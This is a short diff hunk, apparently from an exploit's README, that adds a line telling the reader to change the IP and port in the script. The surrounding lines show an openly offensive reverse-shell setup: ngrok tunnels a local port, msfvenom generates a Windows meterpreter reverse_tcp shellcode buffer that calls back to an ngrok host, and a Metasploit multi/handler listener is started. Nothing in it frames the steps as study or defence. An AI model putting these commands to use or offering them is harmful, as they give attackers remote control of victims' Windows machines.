@@ -218,6 +218,7 @@ small changes
 set up your ngrok 
 'ngrok just simply map an ip and port to yours it acts like a vps'
 $ ./ngrok tcp 1234
+change ip and port at the script to the machine ip and port 
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io  LPORT=11379 -b '\x00' -f py    #generate new buf
 $ msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport 1234; exploit" #listenner                      
 ```
